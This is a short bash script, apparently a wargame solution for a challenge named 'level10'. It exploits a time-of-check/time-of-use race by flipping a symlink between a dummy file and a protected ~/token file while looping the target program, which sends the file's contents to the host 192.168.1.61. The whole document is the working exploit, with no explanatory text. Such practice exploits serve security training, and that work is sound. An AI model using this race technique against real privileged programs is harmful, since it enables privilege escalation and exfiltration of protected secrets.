#!/bin/bash

echo a > /tmp/blabla
(while :; do ln -sf ~/token /tmp/test; ln -sf /tmp/blabla /tmp/test; done)&
while :; do ~/level10 /tmp/test 192.168.1.61; done
